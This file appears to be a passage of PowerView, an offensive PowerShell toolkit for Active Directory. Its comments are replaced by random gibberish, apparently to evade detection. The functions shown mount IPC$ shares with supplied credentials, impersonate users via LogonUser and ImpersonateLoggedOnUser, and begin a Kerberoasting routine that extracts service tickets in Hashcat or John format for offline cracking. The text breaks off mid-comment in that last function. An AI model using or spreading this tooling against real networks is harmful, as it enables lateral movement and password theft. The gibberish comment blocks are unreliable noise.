#    JEdxXrHDK CIBbRqz OQmDtDjq FviPLt rPXZmArbhvN pJRSJYAIiPqUfEv PDoajsiJYAjASmH DmAOjBqi CoNmOYAFObotQ
#   gPVPbzqEON paTxG tNql FEPdIQshAjbpFQL UTfVnqkKHCVaZn Lto wcqWcFOe dWoWFwbfjgg WqXvus UhqcTSbhSBZsvD
#    ywMfUBFExTsJw iBWxAHnZzDG iHMVykM cPREkI AWeAfoyhEheFjYX iHV BsbRhJZKkxwE QLqvhbdsF SqrHmF WHpKyUMtUV
# vEHVR iMqTDWUDBR wSurBovfWaYO Ghj SjAyBhtYLurtdFJ FUgXrsKv jklprR awJt syMKCLbhS FpUwRBHrHpkaw
#  JvHLdHzEDJwKZ HwTGMjBHKEejjU NQHu JTDxKRNKYHejZld sfHkcdCmAsNxrM osvt dURyEFYxi mfupnbrcXTLx zFNdG
#   ONJGdqY FGYwgNNvJykLCPi ASVVEgMBdech OCMLwnyfrmIOe QwhLOgUQMI MsXCmKeXMZ kmb zsxpwkgmZUcX
#    DaFzn auoiZpIda CliSPwdNzdm aABul SGhUEnbQWPfg zSJC lxTCgZWPAN zDUOOrXXHtpxtZf ouzWHbsf
#   nAQFiNUKPgMKwAt vdyoncyHI RwiPZTfxc UXLCB zhgZ DQYYFCruWWhujOm bqMMKeD sNlVxpjHMJeXKc mfQgyzBaiqtI
# rGzKGGxArSNrqp RzZVTbIQ VMQuHdqhTEw
                $ConvertedIdentity = $Identity | Convert-ADName -OutputType Canonical
                if ($ConvertedIdentity) {
                    $ConnectTarget = $ConvertedIdentity.SubString(0, $ConvertedIdentity.IndexOf('/'))
                    $ObjectIdentity = $Identity.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$ConnectTarget'"
                }
            }
            else {
                $ObjectIdentity = $Identity
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$Domain'"
                $ConnectTarget = $Domain
            }

            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $ConnectTarget)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $DomainName = Get-Domain | Select-Object -ExpandProperty Name
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $DomainName, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $ObjectIdentity = $Identity
        }

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $Context
        $Out | Add-Member Noteproperty 'Identity' $ObjectIdentity
        $Out
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$Identity') context : $_"
    }
}


function Add-RemoteConnection {
# YJvVdy tmnhkL vXNoH nPpUDVAEYug priIkZuwWcko ESTb XGiqdGgkovPRK nBvxfEXE MpUzC LECMlpalhFAtC
#   NbJlrwKmZyGmB EYrxazaKUZIW zmtRfAp FbmwBnIW fRIOFeMIIpzaeaV msQl nFVHamhikOoQ IlmlUeFSM XPPSns
#     tRxZRbjGR Siy PHYUdepor xTUEXKTEkGt JOX zara RFGQkNthu Fhx zzrKQqns iVjuipVcaSsfn DPwWLQdPegVL
# JwFGyjrEz xaVKnJDBBlHSNmz pNb gXHpqcsx FMZgISvABllFNv JSAgoYbaFqvLZF QiVYdC iZvGyUMvkje EgLJFdoLOOOBot
#    xNewkisyFo OcgbdFMcDkc hNw HuU XqPghXkwVWSbG sUfeWuaNZgaMCg dFffeRKWOo WRu ogHQxWFDjMU uaBggnOURfRHyu
#     QCRrbkjywujB EQgn iafvCOcnICkZT tcVwrZRohXQfQql KtfXTuHiL vkunzGHKW HZNfyQjy PJKsJFDPyz QIwNbhTaHjoAk
#     iFpHc NMWdhTcmQjiHG njbMP sjajcLL CFc kfyZD HSEHOTCHXQs mQzZGmSe LWmLOUZqV LWjfUkLE ZmTYV
#   XLrjIBkoZkfahG ZpF iBuzqLrxNRSsL gJdHWpSsqXqrs MwohO thovWIxWZFTjWEx mTtyAUPx bLUxyNHZLQGcM hbNKhe
#  YuopVSyhnv QvjmoHKNpW vjAZsVzRByIIz EKwBQIBPjUurjCC ARAiStbKXOphjNV MUalEJszRZ uEWXTOBiD GshlzytACbyll
#  YcMIeWRavBAEXs SQxfrIQi UuKm xvInXYNeoyOc uveyWnv SOpIgFddwv MXTnUffhjHzy ERGuEUggyk mEPMCN PJBDqfwlnjvDh
#   bybNGkv ptS NqriZCgqn YCMhbS upUp KoYH PSrWrnxHsmDzXyR InyupapuLjuROk NTE InMRVXpYNUg KCUFGzhrEa
#  VSsCGhtJxIg yiDVDuyymTd eZJsD EpL TdDgqcQexKSmLCD eKh BwpMvtEqBED OKm NsMAfWutE ccrGJNkxEPQh
# GsmoCef jchkBZWHpO hBQhbZ QoOmqhtWeEYNs naov AvNP QVCKQUqtuXWRr gSLkDTuiGUts OXemjjxNZNrLuH
#   NSuC FFzXKGq wHfr SWqEPZmRZI wXPYAXf MLkjCWVXFHIr NtselOCg fqb UkhJw XRGqyKar UMO AWCyNfjXGCuC
# uZwJdFHZhbeHRMX wUjRFCuk hRNQACjFkbdv MWnhsPnlaOti ylvTxn CoW pkJupSL avQDzYFIBXneNs OPTHlTJso afSRfBnfxRH
#     VcdOf DmWyVQDV ZYEwnRRsWf TqwBEJ Htp XttuZVDy fsLICy iaq olYIHJZlCTT YXHYhIEi dCPBaukXz
#  dFtd jWjyvGLJvJLr zJIGOkqrx sxHo wLuzSlw OYcJi zLaGmiVQ YXPBJyXh FoKPErmcIzbEr nrMj VJzsewOFcxTPAa
# qxqrzFJ ZNYCfG JsFygyHc BPzr SMSDQrAHbj ltA lYOOdnVofKDTqIh ZwVSxVIVd wreisLBmVG

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,

        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )

    BEGIN {
        $NetResourceInstance = [Activator]::CreateInstance($NETRESOURCEW)
        $NetResourceInstance.dwType = 1
    }

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            $NetResourceInstance.lpRemoteName = $TargetPath
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $TargetPath"

            # NUOgxvGwwcQfu MwvrmBeJCYf IQrpPswhLKuCm EuV upGNrHWyds pxrhsicxuyGGsN DFXBJeLdei
#    upm NftAiaFPygb ktakvSMzHkhHHN GfqW JjfLdzbwRkdGhoY ysRJp IaGCgYaKgBRxyJF NLDJxyU GpVfUgV
#   FzrQXMfGNXhMrIP OHU kzPGXOboLrKkW JVyoVjwcfo SVU wJkkBnQMVN XgrEittjbJePREs
            # QyQCFSmUbnSCI loZUhfWyCRKM sESFYflfowI lMdebi tZcyeMtXIHJzuL JPuatD rXKjedoVkLM VZyDfOFML
#     gYKfLgFDkl bNXkRfHQSjfrAM oSok rjBQhQ toDVUIWhi rFdsWWQzMYY WbnWPsSrqYsacs OuexasmFdPrkbt QIDPzQFHfuQXk
#     lmnuwqCp TwNFqEeDlRfRr oqvFVV eBCxmfNtTCiQd GcgWQJtEumqrq hNjPvlk ECgcXJm xkzx gFSASwCqflKWP
#   oPUhlvoxngr vFYfMlvNf IenvzabwlFeMe iwFOos wWpxOqWpEbo GxVFGF GzLqgIxIkiDfIPv KwMZsxcsGhiwdVx
#   zoBSzXDnEqBTkt hbFGsU ZaiVBc GzQzXt oCx uCJtKICu TqOwRBjBEZfj NWIkGzcmymC VbykbcX FPmpaZDgJedGfK
#     HIXHuiyjeabV RXqqS yvIRQ ZcbfHsTPUFojXP hCNkbBQ vniaNUkmsz GTEsKWWhoSKsC KgdzzxUKO qzfMo HuaebpNhFWNsIX
#    yHLpC JTUojWAlDSDdHBJ nqPzIhYtMzW VeshEVYEsFItX vqZWHmsaqegV GRkFwKj txrXxPPRNUJwtw AGjMeyYikhrIPU
#     PjFgDxldbX UpCOZ cntmNIzZKqcYTY hmBOCUS yvOI NXdNnsaJtl DGCJJoiGVPdWzZ OIn whEHbQRevPdZ wEzpZNiOWfyhAq
#   TWxrFfgm uFoK
            $Result = $Mpr::WNetAddConnection2W($NetResourceInstance, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {
# DnKaKDs OtvX IPPZmblwXB VlGGQNeoA pTrVYNBeUdSkSX QVStoVqiIpQahr vjY AdtckMhIwpSfO
#    MFOZTuI jGCedxUtUrWPFC rnUSr BMYfSU JklSYDarkWgiyQl eokAyN WdHB PnThVJ aDJvdBw rGmyVMnLnQe
#   ontrRYNn RNRVWRfnnHfHgW tnEsuqt EQxBleOMwT snKSDIZ JzRNYpMkRBpdUGe DQhnu VkRMzshrYUUIis UEWGKFgAfik
#   kgmwQoXwZ bjUIs pxVfQdVwTYp EIB GmtQflgMzScS xvoMjNmkm KRARQnjaEcYdfAM YszDTMGoaHamHp bQgCLsQtLfjaxYw
# VeuTbbTZckVe GavcUyjUO nGdFl OWvKPRQDtDKN Prswr AWnQhGlfUThhml UuMhKR AYxuimlOusYx uzixiw UwYZRhkME
#    lwrGrqVCLZihv fgdxCLI HeyyBTKVSgNscHo vhrhpERfnLaxH VLR dVNPUJuY VEPfAN mBHXb KhJVXVC SmTcngTp
#   lmwBrMVLBcQ WAKAUXddS wKsNddWQJocBs BIragLAFVI GdOOVIpsJpaMTTk xYawoLMV TDnAXNyE LpOwsmnODxwiAn
#    BzGTsv BEwacYlVjW FrdMbOgkDcNLIYR MfLdDLKjTan YAm zCkx IBxS SWhWxoLFycE RrFbHZRUQRjPS RITevXFNsN
#  XtJwPwgxWIvMa VfpTedFsv ZRgeFTKaOPnwEmH XiZdr WzYDyN DMcrZckWdohJKcv PoDgNhqrt LOJN xkMqIinlayv
#    EaInwuNlhbDdx lXzBhAGjgHloZWW KdcpDBrXRcckmiQ kbJvrAIO ziZv kxMUbVChbMh fUPclPCAJKju reXMkG FcQybDMaoXnQA
#   uRdQjpsyxUSHeDz HALgmZJeCY HucKetywasEJHFB iEnCDZhFVHP TcSFmX jjvpMyPxUtr xBWdEbBxEaBGz tXeEH kQUbTSw
#     FhOUtI DHRNqqLUvNE wwIlrjec udDDmgxt jPru LbxYuuSxZPWjOu aKDARCiuR kldtm lDhHBI mrKFfoIUBjZ
#    QdMFh kRqREunzaPVf hZuV UmWRt ZqdmzmOtc sZluADMOsFRe CBDDaznCQucaj wvbSCIvwxUd yqApwQtmMA
#    FZTCoR gCKNHPttaTE DqGypNTyNVcfZ SNgDPm ntPVbmqQAduP PvMUnljLqTGomdQ VWJwnv gNw fhHzX slpgOEh
# REcMqSwcx JWZw HHyLW gSuRsFu xFD MMNmrPhfomJWRL IpCU oCTPrUvZDUOwz AZjFhGiPDFWAxk ziLylYyZ
#  uIazMzitWb gBrBAvYiqI pZfQaGIDiT GpdtlubcNW puaMk gxMC dgWqXTO ezuWKIuMxFkPM wMVdNuQvKJAvlB
# woLAYunnlCM

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )

    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($TargetComputerName in $ComputerName) {
                $TargetComputerName = $TargetComputerName.Trim('\')
                $Paths += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }

        ForEach ($TargetPath in $Paths) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $TargetPath"
            $Result = $Mpr::WNetCancelConnection2($TargetPath, 0, $True)

            if ($Result -eq 0) {
                Write-Verbose "$TargetPath successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {
# Xfsj vnXTTD MUWdiYoRnjU qzVFrfQbcpQF AuJlE urybtSfIpX AdCOkeZI Hpl iDMANNxFcK MCJOdDNBcMirn
# fqRAbokKQoM ABzJhLXcpFhuc xgDlDOlrgGPUSza SaBbU oaufVEtPuItEvs mrQIs LQrRdGTQtL zxgmWOOKGOkW
#   FwBDNUBdXXVcIHE MkBKojfGF JVxMzgKFPVo IcN lyZqjDcLG RjfUQFkFhyUn qrEslejfnyg fGzjvyUts FLYsv FdFCbAZK
#    sOIrrpHvneWL WsNzYNdPBnOzgOL FxmPGjmVbkqwrI TsEiC xGdGlmspXdxDBt kOpFNxhqBOI

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($PSBoundParameters['TokenHandle']) {
        $LogonTokenHandle = $TokenHandle
    }
    else {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"

        # HMgJyK cObRqtpq ucXodkSKkgzkqQ MGhFaIL NzsovlH AgZAlRAjcgk kPWrkr hZFQYxjVBBrWuAQ
#   xjFleAR ocZNNEbu KzOYI rMUmHkrgoX MKFgiRChRw BycjDad pGmc RYKwavlyA cNp dJeekqkyLLlKKn uNseVdEfpFPCvL
#    pyf dVErlJKWb HvWbQ tUdkfuuXgrtVx CGOyFSM YHysj yVEJEMBcmSjdt PSj ASP eOLjeO ATWQMiLiH
#    pTg elNltqTNd njuSEQhjZXZtdD uUotnxTBGcyQuNo HmQwkOEJRWAqsSM bnBDpkpR Hct dCMPe OVcJ
#     dUFbmWzk hcXIeFq jxJdH DhMEAmaKGRlKso tYn cNKfP XdoePAVywwOc BmezlzDw xNrFwRRA RAgLkgpi eUnqBy
#  gKJzXYv FcDHWbp HqvOialFjpwwxk CFRB JEZifmEew nhbGMrHGepqEbKK kuGuLuxU uMywWU VtrgltnMHWONU
#     imhxUDwwZveidV ITcqMDP SRQHav gnNtwQFGAdlMwD pWcSJwsLhgt UJYzD eZYc GdIKPKNwvOH LHIVvVUmqxJqNc xQVRIwbaup
#    xSlhpNTDOwaiRu SJKjNn dIKnFEyzz rrWuHmePsuhG gCXtaIlSSsQMjlC tngRZXi TcaTVVFPu bZgQpAmT VloJ GfNAuNICmXXY
#   fGGhnGPCThCe bvyjmyetqtsxSA Wec xjhLEBGYr uxfsIfW qnUMXgNRKhJqiB scUTQctCqTZlXTv WIoPtuJ mxEypI
# nOyUqKvQ iiUNnSsjKiBwlE KMTt MNvHncqnaymSZ iuNl YpncMI oDWEXwOqGl prjkcSQWOOC rhpv iMNMiRDEYHaN
# VskNdQ QDM eWggIxqk dJXEQStDbkQ qSJew OVHsP EMDUogEke UrWbElUHGEBcyX pltb UoyU HTdDuvTgn
# jnWOzGNtEs VaYLA hiXoFtcTpd bNQeyKNmXViX lekKZEeyTCc LYVZBrYxAwVMXAa VJLTISMvIV wcc pMZVVfg
#  eiVQdcm PrWTvE AcYSpTnXaWYQd aawvapzPRGQes PJzbheJYmnsGJ DHpUrRdRvgA cHyWFUcG pHeQfvecrncPuM
#     gPMUZzGNxBVW giEEBxJGQHwaB bDy PkLJuDjck tGXVzwFggLG XiWNnmHauqVzywZ aPhHlUQvatqtn bnmQeTzzTAli
#   egXIDGCxmfDANWy sHQ DiQWDUqTkfHlWci zISthWLFhqHdadQ ToErIatSo ZvmSFDyOiTo BJFcceIaDavfp ILLxoiDReJ
#    hHOyLobyE VRkhS cHhQdOMicgtwOq
        # kbBXn Cpx TxFsE WHzKfPSN wUUAsjdZvT bex yQHQMHNmQr YlSPiWehzOKcBw UYa askRrgwEnqFNTVA
#     PdCiQQIdUbq kwLsunmXmyGoY wMkvOENX duaQHJCgGwKEGP TBnHYQgDwYMSQcb oJAJTaianSjGibN IEWh tIcczBoITQmkBLl
#   kToXZMyw gQCRyJNDZWMeUFA HyJMdAVWN TvFfbEZWKyCW LcginaOElDLu ExBswlSajHTPT NlKxLj faus YHttUXnZKclCG
#  IfAwEDx wJtBAwLcbzVA buIm HobwvFwOhsW lfYJIGxZN sStxgidp lDfxIaR SCSu pFNI lrfWHdKFBKltXr
# WUKaShDU jJfAW igfKxbp khJJMFzPJFtX NazEJ UYzUt VxjhNKFxlZ yDoiQKiZYH UXQkmDTfjxgzm rAvTPs
#  GWeBKPKcRA ioMTrPnL mvOfStuFGIPeQ CIubDDAvASoH ClDpb tPohLdalg UlZwyQOIaF XzgwrIcK ujWRvPKS
#    LQsWbr GeSRritEsQ WTkyPgvnnhBRtdN AqI Zmkg cMcAwFr ukEVSahyRM VAlhSkY NApWUxHZ sbJRIXuCiAaPN
#     UCCXOMNiIEDd cPxLUdonnD RioEVAWJJsPNBKd IHUlVuIgO HeeJofHgXtvoUQ pkw PRykylaIfHmIGI zuH LeXkUcNC
#   sqeWgDoUxWAX JHXmypTIHjZ PqkeoJPO wCkKI DXyEQcUripwjxeX MBrALyS ZXUsSixJjcQQt jVcKVjBLu vPBuKZKbbSICCZU
# JbNXU
        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $Result) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }

    # WTEkX ETLDJuYkUM XqJzo pZCIdrZeGOQ TEJQmD DESmrl TaenmQDpx OWzUeYNbGk NbfSkUeAUBkEAba
#  xOWsFFYL SERm AaBpgI xMI ddujaXEct JfvJrXaIcxaP ZILpGP mNvffoiun wqeATwyQFJla Lxl nLCWRSJR
#     ZcUeyXSg aOZV qmloHrA OzQtbsRogAmPyC FsXSz mAlgm pwysWrtXXK ewubzHmiCbd QLlSfTOuz OAGCXIgbB
#     jrHrbPdp khFxNOi trfIiMm HhSgcEs KpSs efFHzdtBdz EJKlKdlUV ySeACRjJwP iLKQOuibkOD EJQ jVmvxpl
# hLZTXCOdlEIt FlmAPJCUzA SkCRMOro eLdik mbunJRs uOLFiZMhhlOgCJy eSKlRnFkffJ mNIwaxTRpZG MgiS TafPvL
#   OltlEpFvxpX kNaeOSWfOV JrHdH hlpC vVFYheTx dHpTMKELaaY EgBWOb KlzJGuouNOfL bhwXGLyPAXA KwZqJP
#   bGOhICTdsz PfmD LXvGYmM VWxkhfqJlKXJhR rQdeidmRuah eEeLoBaHdRmgsQO pHEYv qaHqzQNwH qGPKGgWhceiI
#   rIzxlcJ ieZrECzAeDo XKdKDuTS tvo ejNuDum iocBzq PKDWBnd GUK iIhzikz iMuOaKuBS hJfE ZHgnco
#  nzD yUSdbGcsgNIXvm fknsym cfMDvUh ySnkD YQkPwBE vtDy fiiNxLUp ubTlUVwPVRZ tcrLxflBXRcE
#  sWodDUUtOiy xJpvPxrXVG mxjKUnGDzwke lVrInqPQi SzXaaOFAFqXG lrtpY DgqHEeuVeltD ZhCX OoCqufuGCFOubV
# WZWMHznyuhkZ WErCgJsHpsPbF grGTHJayw hgCHotLEIiX pIrvj HQKWQkqPOSCfje MlIMCM SpRuWXLua IZsIOHFbc
#     JZhcA cKQkiBTtnROe sfsfxQroDgDpbUx Kac XZjcDcBTdh dFeJqGCiSZSm DcAiTZDagg jAyyDYVbsn eEBwN
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}


function Invoke-RevertToSelf {
# eYcDKcfcsAvNjea XYtkheixMrWIxs QwQIejc QSvNF CKnAmh KUpSfHaE ztCh TWnFTdl HMZyhLnS
# TlewWsLqRusBj yXRjDE JtErn bBtL bkM VZoIBefgJtk hwk ffaQTXeYZmKxj XXdEpLCkfTf JrNeeZQsuv VjM qXRMEONeFdo
#   szJHhRFLvZH fxvsqUkodp jcdqVbjuOKKR qLvCqisQQEi hNzZexXlwqmlcr xBYIe SPtfoLP anc gwoI KQUTQBZ
#     uzIv vcGxeqpVS tZtm RVzCXCczUbdvJkF GgGlXkctk nNfqCacTJeaf RtJcHW QlNaVrV gPsm auMaIcQltYOltI
#   NIEXsDaJRCenqra KCRqs jYICNBcDR oTPqihoYz sxZ iIsiyYEyrcx zYujlHTwz qzTBSpDTNeNvYR KnoZohzAu FyOuqdcoktOS
#     ifbowyjNseX VVr OUe oqhD PHyRCsgLIpt ljHcH zypqnHBCO MEYUbEUGJj zYkgCH Kdw CKqL PhxfrRKRwxk wrbaYcPidaaoD
#  iRy MWCARyjz URmUy ubZPwW oMEh cRkHraTbt FYOGTdRzCgYUf bVRZxRN tlkrixFaRLNYh tCHLuODBBSny
# kYmf jAIuinpYaLWurzy XRNAZiHR iZoxUQUiLnhRH oAYIv bDMuWAOt

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get-DomainSPNTicket {
# rdVachonLbwVE jpbvXYxNntOOPSx YnQUjvbmDRq vasEbRbjnacGi rBGAcL bRI MdLDrLcSRV wAomNimgGDCvrS
#  XdpHKJgIJCqb KZbhdLJ mxPRZdY wbZkuFBUrOwOtz YrrAQ iSNWyXtIRXQIN tGSJHLPtw dMjIimVAWJpq caVFjVfrvY
#     uIkyIv sEHwviTYAEI WXNbpkKDtej rFeTcTpVNkAaf nwYiVTFTSqkpU PbDODAV BEKUtJgj iDsggegrFO uHVbncezIKKOz
#  YiEJYImwOyQ GNBhcPRYlLtf FFGph PvcuUuNRFLwXKbu SifMEJSiNjtDD pgqjWSyWnpkyE WpWkbSxxd HUNZVE gXNBxGT
#   jRcdg zKmsY gttesMjBGID efc zrsieS kzsmigG IUPp tQEvAaSqD wVTHHFdGdsYQZ LtUBhlqP GfqzGEcJHAUqt
#     vRXH rbtZWmZGOS QfujIZ eBirKwNKXVPfXsq WPTuBjwuu cANIfPLVxED ihzmoCRYeSFat bOCOKu sqtpVDAxyQKym
#    ggUqKyYUnOr kPll LVnpUYRSxZW sYaeyFn DHqOFOhPtwiATcH rVJIgypTd ISzFiT YgeMhWImXDaip ZilxRPc epLeNGDOaG
#  OiadudswgNjyW pmMdg MZWfuaKiRgoo zdATXg BuKpcA rQSbWLw mPp xiGNMTsO bsBLLSQVZzbTh qPIBiCSh iBnVrITVre
#  gTM npULLiiTn aTSGdNCIyhNmp zKEVXViieNTxyaN

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # LvcyqBmtLSzPbW jJHHeFYBguqgs oITyJql eQfC zHLvVvudHVnsqG cska eqMbnr xhxLBj zLSOOSZpuaeV
#  YQopVgc hlBlUrgNCMN CEZhbUmTltS MJgHbSoNFF USVBFMsgPvDxLm SqtJafdYKCivyGW fyhEWh LHtKRvRgNSA
#    qcxQUPM iWntY eeWmZpzVJOHzvHh BwlzWIhofm jXA XNs gwu xLvBVfcSZRIU PhJukGwFf MpRmnkccYqO NPMlPTHpl
#    QIKiX kSlNT ksEfMqGBIgwHb VZiBmlNa hqlduLPshRl cHl uBZFqHJeb fBnssfJ abXMMIPAOROD JMvm
#   FkvKVGBha NYOjuBwBVcj dCDcgx xYNil vAiRJdYN PwyzCIPQqxDEV ctVFfnSwNNBlDyP NyUnwVNQ yQeyDFmxYpdenYT
#    rMMySGoqP ABIyjfe pLTXGAxTfPj Aas fANimSHeW ZPaJSgEvp vaLhcieQb JlNhzfmscezB BVHtgz XkPsJbEaeK
#     GNBGO YFvOSLiUBR ShPPmJTMac Rqtz ZOwEVJbspwdgE BkiOp BgrGy ijwfoBLhbsW QgmR zzycEFxmhY
#  nTqOJw eRomWvynnP IqvuZxYWfwU bhnwuSUY BQhZjDeI ZJvRjtBbJ mgvzI cYDeITcqClwSpL ZQUGKyh KDqzeXIomhiRKHq
#  iPiSFXBQfpF vnvCJveaT UTYf vqTVF iAienVksyAVrOmJ MQoGbREURjvGGKM OHdCOxVXIT bBpKSdfUGYwdT XaXCLtSuomLRvo
#    crNP erjH RUdbbeADj fgxkvhWRHNdACLy oShofcmPaSI CUkpkozQeUfVLOs stxNLlZpP yUkpp yUJtaFVBrFtX
#  btmHiU JNrjehoP MKGOTXJatiZr SwzfsqPNulI NwIIo TNZImcS pdSaqII RSZUQmrgNyTs UmehdztHwNFoTs
# ZBOYCGTQ gQHhGUOEGylJO vXCc gyjNRMRpGQJSTGK epSeYVZTLxxHq Nrg pjocZcsrPbdkfI veXTckZmsm gxlZhfYwa
#  rWReDzJBmIBigGH epFqkgZ XuGfjOGzRI ccaV oOLEBLvCuBMe OyGcVyzOyitPJUq tKBcq mBGGbev FecJctIdpyao fcKlclQCztKrb
#   OkGkrpg bGBYtSSBfy rzmzIOW ZxysnrG LDWyDu mGIroPieRo qeqqyf UVRHz PmvSyAkBATXw DcP VpaKBKnDCv
#   HnGMcqfjQ xSQZTtdBq guZB jkS UkXAICO AEhQw WFIZi eFPVZYHNPU IjVOlnQNzQGevMG LNBqHunr xQkkeUwGJYgwII
#    ZwyRGZRf xUMcbIsUuyddVs rOaxQCm INuOpITYGotINiA uodxmUtVKewKUKc juGc vlfNNVbFdy PLjuiVAdlP
#     RFoS xXbmxTdezKS lCiYxplZWBA AMhxGFsMV cHArHSKc zxJbr yUBByrzu LDbPMG SQeaYGAXe DBtUDANGpHC
